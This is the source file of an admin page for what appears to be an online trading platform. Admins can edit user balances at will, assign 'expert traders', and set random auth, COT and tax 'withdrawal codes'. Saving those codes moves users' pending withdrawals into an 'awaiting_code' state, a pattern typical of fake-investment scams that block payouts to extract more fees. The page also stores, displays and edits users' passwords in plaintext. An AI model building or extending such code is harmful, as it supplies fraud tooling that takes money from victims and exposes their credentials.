import { useEffect, useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { supabase as supabaseTyped } from "@/lib/supabaseClient";
const supabase: any = supabaseTyped;
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Switch } from "@/components/ui/switch";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { StatusBadge } from "../components/StatusBadge";
import { BalanceModal } from "../components/BalanceModal";
import { toast } from "sonner";
import {
  Trash2, Ban, CheckCircle2, AlertTriangle, ArrowLeft, KeyRound, ShieldAlert,
  Sparkles, Briefcase,
} from "lucide-react";
import { currencySymbol, formatMoney } from "@/lib/currency";

const ACCOUNT_LEVELS = ["Basic", "Veteran Account", "Master", "Ultimate Account", "Diamond Account"];
const genCode = () => Math.random().toString(36).slice(2, 10).toUpperCase();
type CodeType = "auth" | "cot" | "tax";

// Full ISO 4217 currency list
const ALL_CURRENCIES = [
  { code: "AED", name: "UAE Dirham" },
  { code: "AFN", name: "Afghan Afghani" },
  { code: "ALL", name: "Albanian Lek" },
  { code: "AMD", name: "Armenian Dram" },
  { code: "ANG", name: "Netherlands Antillean Guilder" },
  { code: "AOA", name: "Angolan Kwanza" },
  { code: "ARS", name: "Argentine Peso" },
  { code: "AUD", name: "Australian Dollar" },
  { code: "AWG", name: "Aruban Florin" },
  { code: "AZN", name: "Azerbaijani Manat" },
  { code: "BAM", name: "Bosnia-Herzegovina Convertible Mark" },
  { code: "BBD", name: "Barbadian Dollar" },
  { code: "BDT", name: "Bangladeshi Taka" },
  { code: "BGN", name: "Bulgarian Lev" },
  { code: "BHD", name: "Bahraini Dinar" },
  { code: "BIF", name: "Burundian Franc" },
  { code: "BMD", name: "Bermudan Dollar" },
  { code: "BND", name: "Brunei Dollar" },
  { code: "BOB", name: "Bolivian Boliviano" },
  { code: "BRL", name: "Brazilian Real" },
  { code: "BSD", name: "Bahamian Dollar" },
  { code: "BTN", name: "Bhutanese Ngultrum" },
  { code: "BWP", name: "Botswanan Pula" },
  { code: "BYN", name: "Belarusian Ruble" },
  { code: "BZD", name: "Belize Dollar" },
  { code: "CAD", name: "Canadian Dollar" },
  { code: "CDF", name: "Congolese Franc" },
  { code: "CHF", name: "Swiss Franc" },
  { code: "CLP", name: "Chilean Peso" },
  { code: "CNY", name: "Chinese Yuan" },
  { code: "COP", name: "Colombian Peso" },
  { code: "CRC", name: "Costa Rican Colón" },
  { code: "CUP", name: "Cuban Peso" },
  { code: "CVE", name: "Cape Verdean Escudo" },
  { code: "CZK", name: "Czech Koruna" },
  { code: "DJF", name: "Djiboutian Franc" },
  { code: "DKK", name: "Danish Krone" },
  { code: "DOP", name: "Dominican Peso" },
  { code: "DZD", name: "Algerian Dinar" },
  { code: "EGP", name: "Egyptian Pound" },
  { code: "ERN", name: "Eritrean Nakfa" },
  { code: "ETB", name: "Ethiopian Birr" },
  { code: "EUR", name: "Euro" },
  { code: "FJD", name: "Fijian Dollar" },
  { code: "FKP", name: "Falkland Islands Pound" },
  { code: "GBP", name: "British Pound" },
  { code: "GEL", name: "Georgian Lari" },
  { code: "GHS", name: "Ghanaian Cedi" },
  { code: "GIP", name: "Gibraltar Pound" },
  { code: "GMD", name: "Gambian Dalasi" },
  { code: "GNF", name: "Guinean Franc" },
  { code: "GTQ", name: "Guatemalan Quetzal" },
  { code: "GYD", name: "Guyanaese Dollar" },
  { code: "HKD", name: "Hong Kong Dollar" },
  { code: "HNL", name: "Honduran Lempira" },
  { code: "HRK", name: "Croatian Kuna" },
  { code: "HTG", name: "Haitian Gourde" },
  { code: "HUF", name: "Hungarian Forint" },
  { code: "IDR", name: "Indonesian Rupiah" },
  { code: "ILS", name: "Israeli New Shekel" },
  { code: "INR", name: "Indian Rupee" },
  { code: "IQD", name: "Iraqi Dinar" },
  { code: "IRR", name: "Iranian Rial" },
  { code: "ISK", name: "Icelandic Króna" },
  { code: "JMD", name: "Jamaican Dollar" },
  { code: "JOD", name: "Jordanian Dinar" },
  { code: "JPY", name: "Japanese Yen" },
  { code: "KES", name: "Kenyan Shilling" },
  { code: "KGS", name: "Kyrgystani Som" },
  { code: "KHR", name: "Cambodian Riel" },
  { code: "KMF", name: "Comorian Franc" },
  { code: "KPW", name: "North Korean Won" },
  { code: "KRW", name: "South Korean Won" },
  { code: "KWD", name: "Kuwaiti Dinar" },
  { code: "KYD", name: "Cayman Islands Dollar" },
  { code: "KZT", name: "Kazakhstani Tenge" },
  { code: "LAK", name: "Laotian Kip" },
  { code: "LBP", name: "Lebanese Pound" },
  { code: "LKR", name: "Sri Lankan Rupee" },
  { code: "LRD", name: "Liberian Dollar" },
  { code: "LSL", name: "Lesotho Loti" },
  { code: "LYD", name: "Libyan Dinar" },
  { code: "MAD", name: "Moroccan Dirham" },
  { code: "MDL", name: "Moldovan Leu" },
  { code: "MGA", name: "Malagasy Ariary" },
  { code: "MKD", name: "Macedonian Denar" },
  { code: "MMK", name: "Myanmar Kyat" },
  { code: "MNT", name: "Mongolian Tugrik" },
  { code: "MOP", name: "Macanese Pataca" },
  { code: "MRU", name: "Mauritanian Ouguiya" },
  { code: "MUR", name: "Mauritian Rupee" },
  { code: "MVR", name: "Maldivian Rufiyaa" },
  { code: "MWK", name: "Malawian Kwacha" },
  { code: "MXN", name: "Mexican Peso" },
  { code: "MYR", name: "Malaysian Ringgit" },
  { code: "MZN", name: "Mozambican Metical" },
  { code: "NAD", name: "Namibian Dollar" },
  { code: "NGN", name: "Nigerian Naira" },
  { code: "NIO", name: "Nicaraguan Córdoba" },
  { code: "NOK", name: "Norwegian Krone" },
  { code: "NPR", name: "Nepalese Rupee" },
  { code: "NZD", name: "New Zealand Dollar" },
  { code: "OMR", name: "Omani Rial" },
  { code: "PAB", name: "Panamanian Balboa" },
  { code: "PEN", name: "Peruvian Sol" },
  { code: "PGK", name: "Papua New Guinean Kina" },
  { code: "PHP", name: "Philippine Peso" },
  { code: "PKR", name: "Pakistani Rupee" },
  { code: "PLN", name: "Polish Zloty" },
  { code: "PYG", name: "Paraguayan Guarani" },
  { code: "QAR", name: "Qatari Rial" },
  { code: "RON", name: "Romanian Leu" },
  { code: "RSD", name: "Serbian Dinar" },
  { code: "RUB", name: "Russian Ruble" },
  { code: "RWF", name: "Rwandan Franc" },
  { code: "SAR", name: "Saudi Riyal" },
  { code: "SBD", name: "Solomon Islands Dollar" },
  { code: "SCR", name: "Seychellois Rupee" },
  { code: "SDG", name: "Sudanese Pound" },
  { code: "SEK", name: "Swedish Krona" },
  { code: "SGD", name: "Singapore Dollar" },
  { code: "SHP", name: "Saint Helena Pound" },
  { code: "SLL", name: "Sierra Leonean Leone" },
  { code: "SOS", name: "Somali Shilling" },
  { code: "SRD", name: "Surinamese Dollar" },
  { code: "STN", name: "São Tomé & Príncipe Dobra" },
  { code: "SVC", name: "Salvadoran Colón" },
  { code: "SYP", name: "Syrian Pound" },
  { code: "SZL", name: "Swazi Lilangeni" },
  { code: "THB", name: "Thai Baht" },
  { code: "TJS", name: "Tajikistani Somoni" },
  { code: "TMT", name: "Turkmenistani Manat" },
  { code: "TND", name: "Tunisian Dinar" },
  { code: "TOP", name: "Tongan Paʻanga" },
  { code: "TRY", name: "Turkish Lira" },
  { code: "TTD", name: "Trinidad & Tobago Dollar" },
  { code: "TWD", name: "New Taiwan Dollar" },
  { code: "TZS", name: "Tanzanian Shilling" },
  { code: "UAH", name: "Ukrainian Hryvnia" },
  { code: "UGX", name: "Ugandan Shilling" },
  { code: "USD", name: "US Dollar" },
  { code: "UYU", name: "Uruguayan Peso" },
  { code: "UZS", name: "Uzbekistani Som" },
  { code: "VES", name: "Venezuelan Bolívar" },
  { code: "VND", name: "Vietnamese Dong" },
  { code: "VUV", name: "Vanuatu Vatu" },
  { code: "WST", name: "Samoan Tala" },
  { code: "XAF", name: "Central African CFA Franc" },
  { code: "XCD", name: "East Caribbean Dollar" },
  { code: "XOF", name: "West African CFA Franc" },
  { code: "XPF", name: "CFP Franc" },
  { code: "YER", name: "Yemeni Rial" },
  { code: "ZAR", name: "South African Rand" },
  { code: "ZMW", name: "Zambian Kwacha" },
  { code: "ZWL", name: "Zimbabwean Dollar" },
];

export default function UserDetail() {
  const { id } = useParams();
  const navigate = useNavigate();
  const [user, setUser] = useState<any>(null);
  const [pwd, setPwd] = useState("");
  const [pwd2, setPwd2] = useState("");
  const [accountLevel, setAccountLevel] = useState<string>("Basic");
  const [selectedCurrency, setSelectedCurrency] = useState<string>("USD");
  const [codes, setCodes] = useState<Record<CodeType, string>>({ auth: "", cot: "", tax: "" });
  const [codeToggles, setCodeToggles] = useState<Record<CodeType, boolean>>({ auth: true, cot: false, tax: false });
  const [traders, setTraders] = useState<any[]>([]);
  const [assignedId, setAssignedId] = useState<string>("");
  const [balanceOpen, setBalanceOpen] = useState(false);

  const load = async () => {
    if (!id) return;
    const [{ data: u, error }, { data: c }, { data: tr }] = await Promise.all([
      supabase.from("profiles").select("*").eq("user_id", id).single(),
      supabase.from("account_withdrawal_codes").select("*").eq("user_id", id).maybeSingle(),
      supabase.from("expert_traders").select("id, name, specialty, win_rate").order("sort_order", { ascending: true }),
    ]);
    if (error) return toast.error(error.message);
    setUser(u);
    setAccountLevel((u as any).account_level || "Basic");
    setSelectedCurrency((u as any).currency || "USD");
    setAssignedId((u as any).assigned_expert_id || "");

    if (c) {
      setCodes({
        auth: (c as any).auth_code || "",
        cot: (c as any).cot_code || "",
        tax: (c as any).tax_code || "",
      });
      setCodeToggles({
        auth: (c as any).auth_required ?? true,
        cot: (c as any).cot_required ?? false,
        tax: (c as any).tax_required ?? false,
      });
    }
    setTraders(tr ?? []);
  };

  useEffect(() => { document.title = "Admin · User Detail"; load(); }, [id]);

  if (!user) return <p className="text-muted-foreground">Loading…</p>;
  const cur = user.currency;

  const updateProfile = async (patch: Record<string, any>, msg = "Saved") => {
    const { error } = await supabase.from("profiles").update(patch as any).eq("user_id", id!);
    if (error) return toast.error(error.message);
    toast.success(msg);
    load();
  };

  const saveProfile = () => updateProfile({
    full_name: user.full_name,
    username: user.username,
    email: user.email,
    phone: user.phone,
    country: user.country,
    plaintext_password: user.plaintext_password,
    currency: selectedCurrency,
  }, "Profile updated");

  const toggleSuspend = () => updateProfile({
    status: user.status === "suspended" ? "active" : "suspended"
  }, "Status changed");

  const toggleBlock = () => updateProfile({
    status: user.status === "blocked" ? "active" : "blocked"
  }, "Status changed");

  const del = async () => {
    if (!confirm(`Delete ${user.email}? Permanent.`)) return;
    const adminAuth = (supabase as any).auth?.admin;
    if (adminAuth?.deleteUser) {
      try { await adminAuth.deleteUser(id); } catch { /* ignore */ }
    }
    const { error: delErr } = await supabase.from("profiles").delete().eq("user_id", id!);
    if (delErr) {
      const { error: blockErr } = await supabase.from("profiles").update({ status: "blocked" }).eq("user_id", id!);
      if (blockErr) return toast.error(blockErr.message);
      toast.success("User blocked (deletion not permitted)");
    } else {
      toast.success("Deleted");
    }
    navigate("/admin/users");
  };

  const saveAccountLevel = () => updateProfile({ account_level: accountLevel }, "Account level updated");

  const updatePwd = async () => {
    if (pwd !== pwd2) return toast.error("Passwords do not match");
    if (pwd.length < 6) return toast.error("Min 6 characters");
    const { error } = await supabase
      .from("profiles")
      .update({ plaintext_password: pwd })
      .eq("user_id", id!);
    if (error) return toast.error(error.message);
    toast.success("Password updated");
    setPwd(""); setPwd2("");
    load();
  };

  // Save codes and flip any existing "pending" withdrawal transactions
  // for this user to "awaiting_code" so they are prompted to verify the new code.
  const saveCodes = async () => {
    if (!codes.auth.trim()) {
      toast.error("Auth code is required");
      return;
    }

    const payload = {
      user_id: id!,
      auth_code: codes.auth.trim().toUpperCase(),
      cot_code: codeToggles.cot ? codes.cot.trim().toUpperCase() || null : null,
      tax_code: codeToggles.tax ? codes.tax.trim().toUpperCase() || null : null,
      auth_required: true,
      cot_required: codeToggles.cot,
      tax_required: codeToggles.tax,
    };

    const { data: existing } = await supabase
      .from("account_withdrawal_codes")
      .select("id")
      .eq("user_id", id!)
      .maybeSingle();

    const { error } = existing
      ? await supabase.from("account_withdrawal_codes").update(payload).eq("user_id", id!)
      : await supabase.from("account_withdrawal_codes").insert(payload);

    if (error) return toast.error(error.message);

    // Flip all existing "pending" withdrawals for this user to "awaiting_code"
    // so the user sees the "Complete" action button and is prompted to verify the new code.
    // Only targets "pending" — already verified or cancelled txs are left untouched.
    const { error: txError } = await supabase
      .from("transactions")
      .update({ status: "awaiting_code" } as never)
      .eq("user_id", id!)
      .eq("type", "withdrawal")
      .eq("status", "pending");

    if (txError) {
      // Non-fatal — codes saved fine, just log the tx update failure
      console.error("Failed to flip pending transactions:", txError.message);
    }

    toast.success("Codes saved");
    load();
  };

  const assignTrader = async () => {
    await updateProfile({ assigned_expert_id: assignedId || null }, "Expert assigned");
  };

  return (
    <div className="space-y-5">
      <div className="flex items-start justify-between gap-2">
        <div className="min-w-0">
          <Button variant="ghost" size="sm" className="-ml-2 mb-1" onClick={() => navigate(-1)}>
            <ArrowLeft className="mr-1 h-4 w-4" /> Back
          </Button>
          <h1 className="truncate text-xl font-semibold sm:text-2xl">{user.full_name || user.email}</h1>
          <div className="flex items-center gap-2 text-xs text-muted-foreground">
            <StatusBadge status={user.status} />
            <span>{user.email}</span>
            {cur && <span>· {cur}</span>}
          </div>
        </div>
      </div>

      {/* Balances */}
      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="text-base">Balances ({cur || "—"})</CardTitle>
        </CardHeader>
        <CardContent className="space-y-3">
          <div className="grid grid-cols-3 gap-2">
            <BalanceCell label="Total" value={user.total_balance} currency={cur} accent="text-emerald-600" />
            <BalanceCell label="Deposit" value={user.deposit} currency={cur} accent="text-sky-600" />
            <BalanceCell label="Profit" value={user.profit} currency={cur} accent="text-amber-600" />
          </div>
          <Button size="sm" onClick={() => setBalanceOpen(true)}>Add / Subtract Balance</Button>
        </CardContent>
      </Card>

      {/* Profile */}
      <Card>
        <CardHeader className="pb-2"><CardTitle className="text-base">Profile</CardTitle></CardHeader>
        <CardContent className="grid gap-3 sm:grid-cols-2">
          <Field label="Full Name" value={user.full_name} onChange={(v) => setUser({ ...user, full_name: v })} />
          <Field label="Username" value={user.username} onChange={(v) => setUser({ ...user, username: v })} />
          <Field label="Email" value={user.email} onChange={(v) => setUser({ ...user, email: v })} />
          <Field label="Phone" value={user.phone} onChange={(v) => setUser({ ...user, phone: v })} />
          <Field label="Country" value={user.country} onChange={(v) => setUser({ ...user, country: v })} />
          <Field label="Plaintext Password (debug)" value={user.plaintext_password} onChange={(v) => setUser({ ...user, plaintext_password: v })} />

          {/* Currency selector */}
          <div className="sm:col-span-2 space-y-1.5">
            <Label>Currency</Label>
            <Select value={selectedCurrency} onValueChange={setSelectedCurrency}>
              <SelectTrigger>
                <SelectValue placeholder="Select currency" />
              </SelectTrigger>
              <SelectContent className="max-h-64 overflow-y-auto">
                {ALL_CURRENCIES.map((c) => (
                  <SelectItem key={c.code} value={c.code}>
                    {c.code} — {c.name}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div className="sm:col-span-2"><Button onClick={saveProfile}>Save Profile</Button></div>
        </CardContent>
      </Card>

      {/* Account Status */}
      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="text-base">Account Status</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="flex flex-wrap gap-2">
            <Button variant="outline" size="sm" onClick={toggleBlock}>
              {user.status === "blocked"
                ? <><CheckCircle2 className="mr-2 h-4 w-4 text-emerald-500" />Unblock</>
                : <><Ban className="mr-2 h-4 w-4 text-rose-500" />Block User</>}
            </Button>
            <Button variant="outline" size="sm" onClick={toggleSuspend}>
              {user.status === "suspended"
                ? <><CheckCircle2 className="mr-2 h-4 w-4 text-emerald-500" />Reactivate</>
                : <><AlertTriangle className="mr-2 h-4 w-4 text-amber-500" />Suspend</>}
            </Button>
            <Button variant="destructive" size="sm" onClick={del}>
              <Trash2 className="mr-2 h-4 w-4" />Delete
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Assign Expert Trader */}
      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="flex items-center gap-2 text-base">
            <Briefcase className="h-4 w-4 text-fuchsia-500" /> Expert Trader
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3">
          <Select value={assignedId || "none"} onValueChange={(v) => setAssignedId(v === "none" ? "" : v)}>
            <SelectTrigger><SelectValue placeholder="No trader assigned" /></SelectTrigger>
            <SelectContent>
              <SelectItem value="none">— None —</SelectItem>
              {traders.map((t) => (
                <SelectItem key={t.id} value={t.id}>
                  {t.name}{t.specialty ? ` · ${t.specialty}` : ""}{t.win_rate ? ` · ${t.win_rate}%` : ""}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
          <Button size="sm" onClick={assignTrader}>Save Assignment</Button>
        </CardContent>
      </Card>

      {/* Account Level */}
      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="text-base">Account Level</CardTitle>
        </CardHeader>
        <CardContent className="flex flex-col gap-2 sm:flex-row">
          <Select value={accountLevel} onValueChange={setAccountLevel}>
            <SelectTrigger className="sm:max-w-xs">
              <SelectValue placeholder="Select Account Level" />
            </SelectTrigger>
            <SelectContent>
              {ACCOUNT_LEVELS.map((b) => <SelectItem key={b} value={b}>{b}</SelectItem>)}
            </SelectContent>
          </Select>
          <Button onClick={saveAccountLevel}>Update Level</Button>
        </CardContent>
      </Card>

      {/* Password */}
      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="flex items-center gap-2 text-base">
            <KeyRound className="h-4 w-4 text-yellow-500" /> Change Password
          </CardTitle>
        </CardHeader>
        <CardContent className="grid gap-3 sm:grid-cols-2">
          <div><Label>New Password</Label><Input type="text" value={pwd} onChange={(e) => setPwd(e.target.value)} /></div>
          <div><Label>Confirm Password</Label><Input type="text" value={pwd2} onChange={(e) => setPwd2(e.target.value)} /></div>
          <div className="sm:col-span-2"><Button onClick={updatePwd}>Update Password</Button></div>
        </CardContent>
      </Card>

      {/* Withdrawal Codes */}
      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="flex items-center gap-2 text-base">
            <ShieldAlert className="h-4 w-4 text-amber-500" /> Withdrawal Codes
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <p className="text-xs text-muted-foreground">
            Auth code is always required. Toggle COT and Tax only when needed.
            Saving codes will prompt the user to verify any existing pending withdrawal.
          </p>
          {(["auth", "cot", "tax"] as CodeType[]).map((k) => {
            const label = k === "auth" ? "Auth Code" : k === "cot" ? "COT Code" : "Tax Code";
            return (
              <div key={k} className="space-y-2 rounded-md border border-border p-3">
                <div className="flex items-center justify-between">
                  <Label className="text-sm">{label}</Label>
                  <div className="flex items-center gap-2">
                    <span className="text-[11px] text-muted-foreground">Required</span>
                    <Switch
                      checked={codeToggles[k]}
                      disabled={k === "auth"}
                      onCheckedChange={(v) => setCodeToggles({ ...codeToggles, [k]: v })}
                    />
                  </div>
                </div>
                {codeToggles[k] && (
                  <div className="flex gap-2">
                    <Input
                      className="font-mono"
                      placeholder="Enter code"
                      value={codes[k]}
                      onChange={(e) => setCodes({ ...codes, [k]: e.target.value })}
                    />
                    <Button
                      type="button"
                      variant="outline"
                      size="sm"
                      onClick={() => setCodes({ ...codes, [k]: genCode() })}
                    >
                      <Sparkles className="h-3.5 w-3.5" />
                    </Button>
                  </div>
                )}
              </div>
            );
          })}
          <Button onClick={saveCodes}>Save Codes</Button>
        </CardContent>
      </Card>

      <BalanceModal
        open={balanceOpen}
        onOpenChange={setBalanceOpen}
        user={user}
        onSaved={load}
      />
    </div>
  );
}

function Field({ label, value, onChange }: { label: string; value: any; onChange: (v: string) => void }) {
  return (
    <div>
      <Label>{label}</Label>
      <Input value={value ?? ""} onChange={(e) => onChange(e.target.value)} />
    </div>
  );
}

function BalanceCell({ label, value, currency, accent }: { label: string; value: any; currency?: string; accent: string }) {
  return (
    <div className="rounded-md border border-border p-2">
      <p className="text-[10px] uppercase tracking-wider text-muted-foreground">{label}</p>
      <p className={`text-sm font-semibold tabular-nums ${accent}`}>{formatMoney(value, currency)}</p>
    </div>
  );
}
